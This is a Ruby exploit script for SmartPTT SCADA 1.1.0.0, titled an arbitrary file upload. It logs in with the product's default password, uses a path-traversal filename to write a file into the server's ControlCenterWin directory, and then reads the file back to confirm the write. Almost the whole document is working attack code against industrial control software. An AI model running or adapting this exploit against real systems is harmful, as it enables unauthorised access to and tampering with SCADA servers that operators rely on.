#!/usr/bin/env ruby -W0 
# SmartPTT SCADA 1.1.0.0
# Arbitrary File Upload

require 'rex'
require 'rex/mime'

host = ARGV[0]

def usage
 puts "[*] #{$0} <host>"
 exit
end

usage if ARGV.size < 1

begin

sock = Rex::Proto::Http::Client.new(host, 
                                    port = 8079, 
                                    context = {}, 
                                    ssl = false)

req = sock.request_cgi(
 {
  'uri'   => '/auth.html',
  'method' => 'POST',
  'vars_post'=> {
   'auth_password' => 'elcomplus' # default login
   },
  })
sock.send_request(req)
data = sock.read_response()
 if data.get_cookies.include?('auth_code')
  puts "[*] Authenticated.."
  cookie = data.get_cookies
  lalo   = Rex::Text.rand_text_alpha_upper(5) + '.txt'
  post_data = Rex::MIME::Message.new
  post_data.add_part("hi lalo", "text/plain", nil, "form-data; name=\"file_update\"; filename=\"../../Server/ControlCenterWin/#{lalo}\"")
  req = sock.request_cgi(
   {
    'uri'   => '/download_update',
    'method' => 'POST',
    'cookie' => cookie,
    'ctype'   => "multipart/form-data; boundary=#{post_data.bound}",
    'data'    => post_data.to_s,
   })
  sock.send_request(req)
  data = sock.read_response()
   if data.code == 302
   req = sock.request_raw(
    {
     'uri' => "/#{lalo}",
    })
   sock.send_request(req)
   data = sock.read_response()
   puts "[*] Reading data from /#{lalo}"
   puts '[*] Got: ' + data.body
  end
 else
  puts '[!] Invalid password...'
 end
rescue => e
puts "[!] #{e.to_s}"
end
